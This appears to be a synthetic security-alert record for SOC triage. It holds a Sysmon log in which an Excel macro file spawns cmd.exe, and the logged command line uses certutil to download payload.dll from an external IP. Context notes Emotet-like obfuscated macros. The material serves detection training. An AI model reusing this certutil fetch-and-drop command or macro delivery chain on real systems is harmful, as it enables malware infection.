@@ -1,0 +1,40 @@
+Alert Metadata:
+Alert Name: Suspicious Child Process of Office Application
+Severity: High
+Timestamp: 2026-07-18T11:05:00Z
+Sensor: Windows Security Event Log (Sysmon)
+
+Raw Log Data:
+EventID: 1
+RecordNumber: 498112
+TimeCreated: "2026-07-18T11:05:00.000Z"
+Computer: "HR-LPT-99"
+EventData:
+  RuleName: "T1059.003 - Command and Scripting Interpreter"
+  UtcTime: "2026-07-18 11:05:00.000"
+  ProcessGuid: "{A1B2C3D4-5678-9012-3456-7890ABCDEF12}"
+  ProcessId: 5412
+  Image: "C:\\Windows\\System32\\cmd.exe"
+  FileVersion: "10.0.19041.746 (WinBuild.160101.0800)"
+  Description: "Windows Command Processor"
+  Product: "Microsoft® Windows® Operating System"
+  Company: "Microsoft Corporation"
+  CommandLine: "cmd.exe /c certutil.exe -urlcache -split -f http://45.33.22.11/payload.dll C:\\Users\\Public\\p.dll"
+  CurrentDirectory: "C:\\Users\\susan.hr\\AppData\\Local\\Temp\\"
+  User: "DOMAIN\\susan.hr"
+  LogonGuid: "{A1B2C3D4-1111-2222-3333-444455556666}"
+  TerminalSessionId: 1
+  IntegrityLevel: "Medium"
+  Hashes: "SHA256=1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF"
+  ParentProcessGuid: "{A1B2C3D4-0000-1111-2222-333344445555}"
+  ParentProcessId: 3020
+  ParentImage: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
+  ParentCommandLine: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\susan.hr\\Downloads\\Resumes_July2026.xlsm\""
+
+Artifact Panel Context:
+
+File Metadata: "Resumes_July2026.xlsm" contains deeply obfuscated VBA macros matching heuristic rules for Emotet.
+
+IP Reputation: 45.33.22.11 is actively serving multiple suspicious payload files observed globally.
+
+Network Activity: Execution followed immediately by an outbound HTTP GET request to 45.33.22.11.
